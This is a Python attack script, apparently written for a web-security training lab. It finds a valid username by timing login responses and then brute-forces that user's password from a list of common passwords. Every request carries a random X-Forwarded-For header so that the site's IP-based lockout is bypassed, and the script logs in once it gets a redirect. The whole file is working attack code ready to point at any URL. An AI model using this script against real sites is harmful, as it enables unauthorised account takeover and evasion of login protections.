import sys
import requests
import urllib3
import random

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
username=['carlos\n', 'root\n', 'admin\n', 'test\n', 'guest\n', 'info\n', 'adm\n', 'mysql\n', 'user\n', 
'administrator\n', 'oracle\n', 'ftp\n', 'pi\n', 'puppet\n', 'ansible\n', 'ec2-user\n', 'vagrant\n', 
'azureuser\n', 'academico\n', 'acceso\n', 'access\n', 'accounting\n', 'accounts\n', 'acid\n',
'activestat\n', 'ad\n', 'adam\n', 'adkit\n', 'admin\n', 'administracion\n', 'administrador\n', 
'administrator\n', 'administrators\n', 'admins\n', 'ads\n', 'adserver\n', 'adsl\n', 'ae\n',
'af\n', 'affiliate\n', 'affiliates\n', 'afiliados\n', 'ag\n', 'agenda\n', 'agent\n', 'ai\n', 
'aix\n', 'ajax\n', 'ak\n', 'akamai\n', 'al\n', 'alabama\n', 'alaska\n', 'albuquerque\n', 'alerts\n',
'alpha\n', 'alterwind\n', 'am\n', 'amarillo\n', 'americas\n', 'an\n', 'anaheim\n', 'analyzer\n', 
'announce\n', 'announcements\n', 'antivirus\n', 'ao\n', 'ap\n', 'apache\n', 'apollo\n', 'app\n', 
'app01\n', 'app1\n', 'apple\n', 'application\n', 'applications\n', 'apps\n', 'appserver\n', 'aq\n', 
'ar\n', 'archie\n', 'arcsight\n', 'argentina\n', 'arizona\n', 'arkansas\n', 'arlington\n', 'as\n', 
'as400\n', 'asia\n', 'asterix\n', 'at\n', 'athena\n', 'atlanta\n', 'atlas\n', 'att\n', 'au\n', 'auction\n',
'austin\n', 'auth\n', 'auto\n', 'autodiscover']
password=['123456\n', 'password\n', '12345678\n', 'qwerty\n', '123456789\n', '12345\n', '1234\n', '111111\n',
'1234567\n', 'dragon\n', '123123\n', 'baseball\n', 'abc123\n', 'football\n', 'monkey\n', 'letmein\n', 
'shadow\n', 'master\n', '666666\n', 'qwertyuiop\n', '123321\n', 'mustang\n', '1234567890\n', 'michael\n', 
'654321\n', 'superman\n', '1qaz2wsx\n', '7777777\n', '121212\n', '000000\n', 'qazwsx\n', '123qwe\n', 
'killer\n', 'trustno1\n', 'jordan\n', 'jennifer\n', 'zxcvbnm\n', 'asdfgh\n', 'hunter\n', 'buster\n', 
'soccer\n', 'harley\n', 'batman\n', 'andrew\n', 'tigger\n', 'sunshine\n', 'iloveyou\n', '2000\n',
'charlie\n', 'robert\n', 'thomas\n', 'hockey\n', 'ranger\n', 'daniel\n', 'starwars\n', 'klaster\n', 
'112233\n', 'george\n', 'computer\n', 'michelle\n', 'jessica\n', 'pepper\n', '1111\n', 'zxcvbn\n',
'555555\n', '11111111\n', '131313\n', 'freedom\n', '777777\n', 'pass\n', 'maggie\n', '159753\n', 
'aaaaaa\n', 'ginger\n', 'princess\n', 'joshua\n', 'cheese\n', 'amanda\n', 'summer\n', 'love\n', 
'ashley\n', 'nicole\n', 'chelsea\n', 'biteme\n', 'matthew\n', 'access\n', 'yankees\n', '987654321\n', 'dallas\n',
'austin\n', 'thunder\n', 'taylor\n', 'matrix\n', 'mobilemail\n', 'mom\n', 'monitor\n', 'monitoring\n', 
'montana\n', 'moon\n', 'moscow']
proxie={"http":"http://127.0.0.1:8080","https":"http://127.0.0.1:8080"}




        
username_num_list={}   
    
def brute_time(session,url):
    url=url+"/login"
    print('(+) Finding user name .....')
    for i in username:
       data={"username":i.strip(),"password":str(i.strip()*800)}
       header={"X-Forwarded-For":"%s"%random.randint(1,1000)}
       response=session.post(url,verify=False,data=data,headers=header,allow_redirects=False)
       #,proxies=proxie)
       time=response.elapsed.total_seconds()
       username_num_list[i]=time
    #get max response time value
    max_response=max(username_num_list.values())
    # compare value to get username
    for name,time_r in username_num_list.items():
       if max_response==time_r:
            name=name.strip()
            print('(+) Max response time : %s'%time_r)
            print('(+) User name base on response time : %s'%name)   
            print('(+) Trying to find password .......')

            # brut force password
            #loop to each password to find the good one 
            for ps in password:
                ps=ps.strip()

                """The X-Forwarded-For HTTP header field is a common method 
                for identifying the originating IP address of a client connecting
                (+) using it to bypass login page from blocking us for brute force"""

                header={"X-Forwarded-For":"%s"%random.randint(1,1000)}
                
                data_ps={"username":name,"password":ps}
                response=session.post(url,verify=False,data=data_ps,headers=header,allow_redirects=False)
                #,proxies=proxie)
                #302 response code main we are redirected to home page 
                if response.status_code == 302:
                    print('(+) Found .')
                    print("(+) username :%s"%name,"\n(+) password :%s" %ps)
                    print("(+) Tying to Log in ......")
                    log_data={"username":name,"password":ps}
                    log_response=session.post(url,verify=False,data=log_data,headers=header,allow_redirects=True)
                    #,proxies=proxie)
                    if "Log out" in log_response.text:             
                      print('(+) Log in seccesfully')
                      exit(-1)
                    else:              
                      print('(-) error while trying to Login')
                      exit()
               





def main():
    if len(sys.argv) != 2:
        print('(+) Usage %s <url>'%sys.argv[0])
        print('(+) Example %s www.site.com'%sys.argv[0])
        sys.exit(-1)
    
    url=sys.argv[1]
    session=requests.session()
    brute_time(session,url)

    


if __name__ == "__main__":
    main()


